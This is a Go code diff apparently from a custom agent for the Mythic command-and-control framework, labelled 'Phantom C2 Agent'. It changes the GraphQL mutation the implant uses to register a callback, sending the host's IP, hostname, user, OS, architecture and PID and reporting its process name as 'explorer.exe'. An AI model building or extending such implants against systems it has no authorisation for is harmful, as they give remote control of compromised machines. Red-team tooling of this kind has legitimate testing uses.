@@ -201,37 +201,26 @@ func RegisterWithMythic() error {
                 Description:  "Phantom C2 Agent",
         }
         
-        query := `mutation createCallback(
-                $ip: String!,
-                $host: String!,
-                $user: String!,
-                $os: String!,
-                $architecture: String!,
-                $agent_callback_id: String!,
-                $description: String!
-        ) {
-                createCallback(
-                        ip: $ip,
-                        host: $host,
-                        user: $user,
-                        os: $os,
-                        architecture: $architecture,
-                        agent_callback_id: $agent_callback_id,
-                        description: $description
-                ) {
+        query := `mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
+                createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
                         status
                         error
                 }
         }`
         
         variables := map[string]interface{}{
-                "ip":                payload.IP,
-                "host":              payload.Host,
-                "user":              payload.User,
-                "os":                payload.OS,
-                "architecture":      payload.Architecture,
-                "agent_callback_id": payload.UUID,
-                "description":       payload.Description,
+                "newCallback": map[string]interface{}{
+                        "ip":          payload.IP,
+                        "host":        payload.Host,
+                        "user":        payload.User,
+                        "description": payload.Description,
+                        "domain":      "",
+                        "externalIp":  payload.IP,
+                        "extraInfo":   fmt.Sprintf("OS:%s ARCH:%s PID:%d", payload.OS, payload.Architecture, payload.PID),
+                        "processName": "explorer.exe",
+                        "sleepInfo":   "5s",
+                },
+                "payloadUuid": payload.UUID,
         }
         
         resp, err := performGraphQLRequest(query, variables)
